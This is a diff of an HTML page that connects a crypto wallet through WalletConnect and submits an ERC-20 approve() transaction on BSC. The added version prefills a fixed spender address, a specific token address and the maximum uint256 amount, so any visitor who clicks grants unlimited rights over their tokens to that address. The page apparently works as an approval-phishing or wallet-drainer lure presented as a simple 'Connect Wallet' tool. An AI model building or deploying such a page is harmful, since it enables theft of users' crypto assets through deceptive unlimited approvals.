@@ -1,81 +1,103 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Web3Modal Approve Demo</title>
+  <meta charset="UTF-8" />
+  <title>WalletConnect Approve Token</title>
   <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-  <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
-  <style>
-    body { font-family: Arial; padding: 30px; text-align: center; }
-    input, button { margin: 10px; padding: 10px; width: 80%; }
-  </style>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+  <script src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
 </head>
 <body>
-  <h2>Approve Token with Web3Modal</h2>
-  <div id="status">Chưa kết nối ví</div>
-  <button onclick="connect()">🔗 Kết nối ví</button>
-  <br>
-  <input id="tokenAddress" placeholder="Token address cần approve" />
-  <input id="amount" placeholder="Số lượng" />
-  <button onclick="approve()" id="approveBtn" disabled>✅ Approve</button>
+  <h2>Connect Wallet (QR Supported)</h2>
+  <div id="status">Not connected</div>
+  <button id="connectButton">Connect Wallet</button>
+
+  <h3>Approve Token</h3>
+
+  <label>Spender Address:</label><br />
+  <input type="text" id="spenderAddress" value="0xb300000b72DEAEb607a12d5f54773D1C19c7028d" style="width: 400px;" /><br /><br />
+
+  <label>Token Address:</label><br />
+  <input type="text" id="tokenAddress" value="0x7e975D85714B11d862C7cFFEe3C88d565a139Eb7" style="width: 400px;" /><br /><br />
+
+  <label>Amount:</label><br />
+  <input type="text" id="amount" value="115792089237316195423570985008687907853269984665640564039457584007913129639935" style="width: 400px;" /><br /><br />
+
+  <button id="approveButton" disabled>Approve</button>
 
   <script>
-    const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
-    let provider, web3Modal, signer;
+    let signer;
 
     const providerOptions = {
       walletconnect: {
         package: window.WalletConnectProvider.default,
         options: {
-          rpc: { 56: "https://bsc-dataseed.binance.org/" },
-          chainId: 56
-        }
-      }
+          rpc: {
+            56: "https://bsc-dataseed.binance.org/",
+          },
+        },
+      },
     };
 
-    web3Modal = new window.Web3Modal.default({
+    const web3Modal = new window.Web3Modal.default({
       cacheProvider: false,
-      providerOptions
+      providerOptions,
     });
 
-    async function connect() {
+    let instance;
+
+    async function connectWallet() {
       try {
-        const instance = await web3Modal.connect();
-        provider = new ethers.providers.Web3Provider(instance);
+        instance = await web3Modal.connect();
+        const provider = new ethers.providers.Web3Provider(instance);
         signer = provider.getSigner();
         const address = await signer.getAddress();
-        document.getElementById("status").innerText = "Đã kết nối: " + address;
-        document.getElementById("approveBtn").disabled = false;
+        document.getElementById("status").innerText = "Connected: " + address;
+        document.getElementById("approveButton").disabled = false;
       } catch (err) {
-        console.error("Kết nối thất bại:", err);
-        document.getElementById("status").innerText = "Kết nối ví thất bại!";
+        console.error("Connection failed", err);
+        document.getElementById("status").innerText = "Connection failed: " + err.message;
       }
     }
 
-    async function approve() {
-      const tokenAddr = document.getElementById("tokenAddress").value;
-      const amountStr = document.getElementById("amount").value;
-      if (!ethers.utils.isAddress(tokenAddr)) {
-        document.getElementById("status").innerText = "Địa chỉ không hợp lệ!";
-        return;
-      }
-
+    async function approveToken() {
       try {
-        const token = new ethers.Contract(tokenAddr, [
+        const spender = document.getElementById("spenderAddress").value.trim();
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        const amountRaw = document.getElementById("amount").value.trim();
+
+        if (!spender || !ethers.utils.isAddress(spender)) {
+          alert("Invalid spender address");
+          return;
+        }
+
+        if (!tokenAddress || !ethers.utils.isAddress(tokenAddress)) {
+          alert("Invalid token address");
+          return;
+        }
+
+        const tokenAbi = [
           "function approve(address spender, uint256 amount) public returns (bool)",
-          "function decimals() public view returns (uint8)"
-        ], signer);
-        const decimals = await token.decimals();
-        const amount = ethers.utils.parseUnits(amountStr, decimals);
-        const tx = await token.approve(scB_address, amount);
+          "function decimals() public view returns (uint8)",
+        ];
+
+        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);
+        const decimals = await tokenContract.decimals();
+
+        const amount = ethers.BigNumber.from(amountRaw);
+        document.getElementById("status").innerText = "Approving...";
+        const tx = await tokenContract.approve(spender, amount);
         await tx.wait();
-        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;
+
+        document.getElementById("status").innerText = "Approval success! Tx: " + tx.hash;
       } catch (err) {
-        console.error("Approve thất bại:", err);
-        document.getElementById("status").innerText = "Approve thất bại!";
+        console.error("Approval failed", err);
+        document.getElementById("status").innerText = "Approval failed: " + err.message;
       }
     }
+
+    document.getElementById("connectButton").addEventListener("click", connectWallet);
+    document.getElementById("approveButton").addEventListener("click", approveToken);
   </script>
 </body>
 </html>
